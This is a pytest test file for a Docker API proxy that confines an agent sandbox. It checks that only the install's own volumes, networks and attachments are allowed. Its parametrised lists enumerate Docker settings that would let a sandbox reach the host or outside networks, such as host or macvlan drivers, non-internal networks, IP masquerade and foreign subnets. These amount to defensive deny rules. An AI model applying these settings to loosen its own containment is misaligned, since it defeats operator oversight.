    {"DriverOpts": {"type": "tmpfs", "device": "tmpfs", "o": "size=1m,context=/x"}},
    {"Driver": "rexray/ebs"},
    {"Name": "pipeshub_sandbox_data"}, {"Name": "pxh-test_mongodb_data"}, {"Name": "pipeshub-sbxevil"},
    {"Labels": OTHER}, {"Labels": None}, {"name": "x"},
])
async def test_a_volume_that_could_reach_the_host_is_refused(proxied, over: dict[str, object]) -> None:
    _, port = proxied
    assert _status(await _call(port, "POST", "/volumes/create", _volume(**over))) == 403, over


async def test_only_the_installs_volumes_are_removed_and_never_the_data_volume(proxied) -> None:
    _, port = proxied
    assert _status(await _call(port, "DELETE", "/volumes/pipeshub-sbx-sbx1-1?force=True")) == 200
    for name in ("pipeshub-sbx-theirs-1", "pipeshub_sandbox_data", "pxh-test_mongodb_data"):
        assert _status(await _call(port, "DELETE", f"/volumes/{name}")) == 403, name
    assert _status(await _call(port, "DELETE", "/volumes/pipeshub-sbx-gone")) == 404


# -- networks -------------------------------------------------------------------------------------------------------

def _network(**over: object) -> dict[str, Any]:
    body: dict[str, Any] = {
        "Name": "pipeshub-sbx-net-sbx9", "Driver": "bridge", "Options": dict(EGRESS_NETWORK_OPTIONS),
        "IPAM": {"Driver": "default", "Config": [{"Subnet": "10.213.0.8/29", "IPRange": None, "Gateway": None,
                                                  "AuxiliaryAddresses": None}]},
        "CheckDuplicate": None, "Labels": {**OWN, f"{NS}.role": "network"}, "Internal": True,
    }
    body.update(over)
    return body


async def test_the_brokers_sandbox_network_is_admitted_and_stamped(proxied) -> None:
    daemon, port = proxied
    assert _status(await _call(port, "POST", "/networks/create", _network())) == 200
    assert json.loads(_sent(daemon)[2])["Labels"][STAMP_LABEL] == INSTALL
    shared = {"Name": "pipeshub_sandbox_egress", "Driver": "bridge",
              "Options": {"com.docker.network.bridge.enable_icc": "false"},
              "IPAM": {"Driver": "default", "Config": [{"Subnet": "10.212.4.0/22"}]},
              "Labels": {"agent_loop.sandbox": "egress"}}
    assert _status(await _call(port, "POST", "/networks/create", shared)) == 200


@pytest.mark.parametrize("over", [
    {"Internal": False}, {"Internal": None}, {"Driver": "macvlan"}, {"Driver": "host"},
    {"Options": {**EGRESS_NETWORK_OPTIONS, "com.docker.network.bridge.enable_ip_masquerade": "true"}},
    {"Options": {**EGRESS_NETWORK_OPTIONS, "com.docker.network.driver.mtu": "9000"}},
    {"Options": {}},
    {"IPAM": {"Driver": "default", "Config": [{"Subnet": "192.168.1.0/24"}]}},
    {"IPAM": {"Driver": "default", "Config": [{"Subnet": "10.213.0.0/29", "Gateway": "10.0.0.1"}]}},
    {"IPAM": {"Driver": "default", "Config": [{"Subnet": "10.213.0.0/29"}, {"Subnet": "10.213.0.8/29"}]}},
    {"EnableIPv6": True}, {"Attachable": True}, {"Ingress": True}, {"ConfigFrom": {"Network": "x"}},
    {"Name": "pxh-test_pipeshub"}, {"Name": "bridge"}, {"Labels": OTHER}, {"internal": False},
])
async def test_a_network_that_leaves_the_sandbox_plane_is_refused(proxied, over: dict[str, object]) -> None:
    _, port = proxied
    assert _status(await _call(port, "POST", "/networks/create", _network(**over))) == 403, over


async def test_attachments_are_the_installs_sandboxes_and_its_egress_proxy(proxied) -> None:
    daemon, port = proxied
    endpoint = {"IPAMConfig": {"IPv4Address": "10.213.0.2"}}
    ok = [("ownnetid", "connect", PROXY_CONTAINER), ("pipeshub-sbx-net-sbx1", "connect", "pipeshub-sbx-sbx-sbx1"),
          ("pipeshub-sbx-net-sbx1", "disconnect", PROXY_CONTAINER), ("none", "disconnect", "a" * 64)]
    for network, verb, container in ok:
        body = {"Container": container, "EndpointConfig": endpoint} if verb == "connect" else {"Container": container}
        assert _status(await _call(port, "POST", f"/networks/{network}/{verb}", body)) == 200, (network, container)
        assert json.loads(_sent(daemon)[2])["Container"] in ("a" * 64, "f" * 64)
    refused = [("pipeshub-sbx-net-theirs", "connect", PROXY_CONTAINER),
               ("pxh-test_pipeshub", "connect", "pipeshub-sbx-sbx-sbx1"),
               ("pipeshub-sbx-net-sbx1", "connect", "pxh-test-pipeshub-ai-1"),
               ("pipeshub-sbx-net-sbx1", "connect", "pipeshub-sbx-sbx-theirs"),
               ("none", "connect", "pipeshub-sbx-sbx-sbx1"), ("none", "disconnect", "pxh-test-pipeshub-ai-1"),
               ("pipeshub_sandbox_egress", "connect", "pipeshub-sbx-sbx-sbx1")]
    for network, verb, container in refused:
        body = {"Container": container, "EndpointConfig": endpoint} if verb == "connect" else {"Container": container}
        assert _status(await _call(port, "POST", f"/networks/{network}/{verb}", body)) == 403, (network, container)


async def test_network_inspect_and_removal_are_the_installs(proxied) -> None:
    _, port = proxied
    for ident in ("pipeshub-sbx-net-sbx1", "pipeshub_sandbox_egress"):
        assert _status(await _call(port, "GET", f"/networks/{ident}")) == 200
        assert _status(await _call(port, "DELETE", f"/networks/{ident}")) == 200
    for ident in ("pipeshub-sbx-net-theirs", "pxh-test_pipeshub"):
        assert _status(await _call(port, "DELETE", f"/networks/{ident}")) == 403
    assert _status(await _call(port, "GET", "/networks/pipeshub-sbx-net-gone")) == 404


# -- callers --------------------------------------------------------------------------------------------------------

async def test_each_credential_gets_its_own_profile(proxied) -> None:
    """The legacy executor's credential cannot make the broker's calls, nor the broker's the executor's."""
    _, port = proxied
    exec_body = {"User": SANDBOX_USER, "Privileged": False, "Cmd": ["id"]}
    assert _status(await _call(port, "POST", "/containers/pipeshub-sbx-sbx-sbx1/exec", exec_body, token=LEGACY_TOKEN)) == 403
    assert _status(await _call(port, "GET", "/containers/json", token=LEGACY_TOKEN)) == 403
    assert _status(await _call(port, "GET", "/containers/legacy-run/json", token=LEGACY_TOKEN)) == 200
    assert _status(await _call(port, "GET", "/containers/legacy-run/json")) == 403
    assert _status(await _call(port, "GET", "/containers/json", token=secrets.token_hex(32))) == 403


def _env(**over: str) -> dict[str, str]:
    return {"SANDBOX_INSTALL_ID": INSTALL, **over}


def test_the_proxy_starts_with_the_callers_it_is_given() -> None:
    both = proxy_callers(_env(**{ENV_BROKER_CALLER_TOKEN: BROKER_TOKEN, ENV_CALLER_TOKEN: LEGACY_TOKEN}))
    assert {type(p).__name__ for p in both.values()} == {"BrokerApiPolicy", "DockerApiPolicy"}
    broker = proxy_callers(_env(**{ENV_BROKER_CALLER_TOKEN: BROKER_TOKEN}))
    assert [type(p).__name__ for p in broker.values()] == ["BrokerApiPolicy"]
    with pytest.raises(RuntimeError, match="no caller"):
        proxy_callers(_env())
    with pytest.raises(RuntimeError, match="different"):
        proxy_callers(_env(**{ENV_BROKER_CALLER_TOKEN: BROKER_TOKEN, ENV_CALLER_TOKEN: BROKER_TOKEN}))
    with pytest.raises(RuntimeError, match="not random"):
        proxy_callers(_env(**{ENV_BROKER_CALLER_TOKEN: "changeme"}))
    with pytest.raises(RuntimeError, match="SECRET_KEY"):
        proxy_callers(_env(**{ENV_BROKER_CALLER_TOKEN: BROKER_TOKEN, "SECRET_KEY": secrets.token_hex(32)}))
    with pytest.raises(InstallIdUnset):
        proxy_callers({ENV_BROKER_CALLER_TOKEN: BROKER_TOKEN})


def test_the_broker_scope_reads_the_brokers_variables() -> None:
    scope = BrokerScope.from_env({"COMPOSE_PROJECT_NAME": "proj", "SANDBOX_DATA_VOLUME": "dv",
                                  "SANDBOX_EGRESS_SUBNETS": "10.50.0.0/16", "SANDBOX_EGRESS_PROXY_CONTAINER": "p"})
    assert (scope.install, scope.data_volume, str(scope.sandbox_pool), scope.proxy_container) == (
        "proj", "dv", "10.50.0.0/16", "p")
    with pytest.raises(ValueError):
        BrokerScope.from_env({"SANDBOX_INSTALL_ID": "x", "SANDBOX_EGRESS_SUBNETS": "fd00::/64"})


def test_the_broker_and_the_proxy_check_creates_with_one_rule_set() -> None:
    """ADR-OPS-02 "one rule set": the profile holds creates to the broker's own ``HardeningPolicy`` class, built from
    the same shared constants, not a copy of its rules."""
    from app.harness.sandbox import docker_broker, docker_policy

    policy = _policy()
    assert type(policy.hardening) is docker_broker.HardeningPolicy
    assert docker_broker.SANDBOX_USER == docker_policy.SANDBOX_USER == policy.hardening.user
    assert docker_broker.VOLUME_PREFIX == policy.scope.volume_prefix
    assert docker_broker.LABEL_NAMESPACE == policy.scope.namespace
    from app.harness.sandbox import docker_egress

    assert docker_egress.NETWORK_OPTIONS is docker_policy.EGRESS_NETWORK_OPTIONS
